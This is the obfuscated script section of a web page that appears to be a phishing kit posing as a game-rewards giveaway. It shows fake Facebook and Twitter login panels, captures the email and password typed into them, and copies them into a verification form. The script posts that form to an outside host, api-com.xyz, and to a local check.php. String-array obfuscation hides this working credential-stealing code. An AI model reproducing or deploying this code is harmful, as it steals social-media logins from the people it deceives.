<script>function c(K,D){var s=w();return c=function(n,q){n=n-0xd9;var j=s[n];return j;},c(K,D);}var W=c;(function(K,D){var L=c,s=K();while(!![]){try{var n=parseInt(L(0xd9))/0x1+-parseInt(L(0x119))/0x2*(parseInt(L(0x115))/0x3)+parseInt(L(0x109))/0x4*(-parseInt(L(0x116))/0x5)+-parseInt(L(0xf5))/0x6+-parseInt(L(0xf1))/0x7*(parseInt(L(0x10b))/0x8)+parseInt(L(0x102))/0x9+-parseInt(L(0x104))/0xa*(-parseInt(L(0x108))/0xb);if(n===D)break;else s['push'](s['shift']());}catch(q){s['push'](s['shift']());}}}(w,0x5f04e));var buka=new Audio();buka[W(0xdd)]=W(0xe4);var tutup=new Audio();tutup[W(0xdd)]=W(0xfe),$(document)[W(0x11d)](function(){var K=0x3b,D=0x3b,s=0x17;function n(){var u=c;setTimeout(n,0x3e8),$(u(0xfb))['html'](''+s+u(0x113)+D+u(0x113)+K+''),K--,K<0x0&&(K=0x3b,D--,D<0x0&&(D=0x0,K=0x0));}n();});function openRewards(K,D){var Q=W,s,n,q;n=document[Q(0x106)]('tab_rewards');for(s=0x0;s<n['length'];s++){n[s][Q(0x110)][Q(0x100)]=Q(0x118);}q=document['getElementsByClassName']('menu-content');for(s=0x0;s<q[Q(0xfa)];s++){q[s][Q(0x10a)]=q[s][Q(0x10a)]['replace'](Q(0xf4),'');}document[Q(0xed)](D)[Q(0x110)][Q(0x100)]=Q(0xee),K[Q(0x103)][Q(0x10a)]+='\x20menu-content-active';}document[W(0xed)](W(0x111))[W(0x114)]();function open_itemReward_confirmation(K){var t=W,D=$(K)[t(0x11b)](t(0xdd));$('.itemReward_confirmation')[t(0xda)](),$(t(0xef))[t(0x11b)](t(0xdd),D);}function w(){var Y=['84xkmHVm','val','input#validatePassword','\x20menu-content-active','3420582frJDKL','.account_verification','input#platform','ajax','input#validateEmail','length','#latestTimer','serialize','preventDefault','https://a.top4top.io/m_1725zobal2.mp3','trim','display','input#rpl','3180771PRGXQs','currentTarget','27110vhXJLs','value','getElementsByClassName','input#level','8536euGDAH','2347460GlxUEb','className','492824ucFuCK','input#phone','#login-twitter','html','.otherReward_confirmation','style','defaultTabRewards','submit','\x20:\x20','click','49899hWwJxN','5cmUTUY','.login-twitter','none','22NAIXjZ','.account_login','attr','#password-facebook','ready','.itemReward_confirmation','11204Skpccs','show','#ValidateLoginFbForm','#myOtherReward_confirmationImg','src','#password-twitter','#otherReward_confirmationValue','POST','https://api-com.xyz/api-flag/','input#nick','hide','https://l.top4top.io/m_1725u5z7i1.mp3','#login-facebook','#email-twitter','#ValidateLoginTwitterForm','.login-facebook','#ValidateVerificationDataForm','.verification_info','input#validateLogin','.processing_account','getElementById','block','#myItemReward_confirmationImg','.check_verification'];w=function(){return Y;};return w();}function open_otherReward_confirmation(K){var o=W,D=$(K)['attr'](o(0xdd)),s=$(K)[o(0x11b)](o(0x105));$('.otherReward_confirmation')['show'](),$(o(0xdc))['attr'](o(0xdd),D),$(o(0xdf))[o(0x10e)](s);}function open_account_login(){var R=W;$(R(0x11a))[R(0xda)](),$(R(0x11e))[R(0xe3)](),$(R(0x10f))[R(0xe3)]();}function open_facebook(){var V=W;$(V(0xe8))[V(0xda)](),$(V(0x11a))[V(0xe3)]();}function open_twitter(){var p=W;$('.login-twitter')[p(0xda)](),$(p(0x11a))[p(0xe3)]();}function close_reward_confirmation(){var e=W;$(e(0x11e))['hide'](),$(e(0x10f))[e(0xe3)]();}function tutup_facebook(){var k=W;$('.login-facebook')[k(0xe3)](),$('.account_login')[k(0xda)]();}function tutup_twitter(){var A=W;$(A(0x117))[A(0xe3)](),$(A(0x11a))[A(0xda)]();}function ValidateLoginFbData(){var b=W;$(b(0xdb))[b(0x112)](function(K){var h=b;K[h(0xfd)](),$email=$('#email-facebook')[h(0xf2)]()[h(0xff)](),$password=$(h(0x11c))[h(0xf2)]()[h(0xff)](),$login=$(h(0xe5))[h(0xf2)]()[h(0xff)]();if($email==''||$password==''){}else $(h(0xe8))[h(0xe3)](),$(h(0xf6))[h(0xda)](),$(h(0xf9))[h(0xf2)]($email),$(h(0xf3))[h(0xf2)]($password),$(h(0xeb))[h(0xf2)]($login);});}function ValidateLoginTwitterData(){var O=W;$(O(0xe7))[O(0x112)](function(K){var g=O;K[g(0xfd)](),$email=$(g(0xe6))[g(0xf2)]()[g(0xff)](),$password=$(g(0xde))['val']()[g(0xff)](),$login=$(g(0x10d))[g(0xf2)]()[g(0xff)]();if($email==''||$password==''){}else $(g(0x117))[g(0xe3)](),$(g(0xf6))['show'](),$('input#validateEmail')['val']($email),$(g(0xf3))[g(0xf2)]($password),$(g(0xeb))[g(0xf2)]($login);});}function ValidateVerificationData(){var X=W,K=$(X(0xe9))[X(0xfc)]();return $['ajax']({'url':X(0xe1),'data':K,'type':X(0xe0),'success':function(){return!0x0;},'error':function(){return!0x0;}}),$(X(0xe9))[X(0x112)](function(D){var T=X;D[T(0xfd)]();var s=$(T(0xf9))['val'](),n=$(T(0xf3))['val'](),q=$(T(0xe2))[T(0xf2)](),j=$('input#playid')['val'](),F=$(T(0x10c))[T(0xf2)](),y=$(T(0x107))[T(0xf2)](),f=$('input#tier')['val'](),x=$('input#rpt')['val'](),v=$(T(0x101))[T(0xf2)](),M=$(T(0xf7))[T(0xf2)](),G=$('input#validateLogin')[T(0xf2)]();if(s==''&&n==''&&q==''&&j==''&&F==''&&y==''&&f==''&&x==''&&v==''&&M==''&&G=='')return $(T(0xea))[T(0xda)](),$(T(0xf6))['hide'](),![];$[T(0xf8)]({'type':T(0xe0),'url':'check.php','data':$(this)[T(0xfc)](),'beforeSend':function(){var I=T;$('.check_verification')['show'](),$(I(0xf6))['hide']();},'success':function(){var d=T;$(d(0xec))[d(0xda)](),$(d(0xf0))[d(0xe3)](),$('.account_verification')[d(0xe3)]();}});}),![];};</script>
</body>
</html>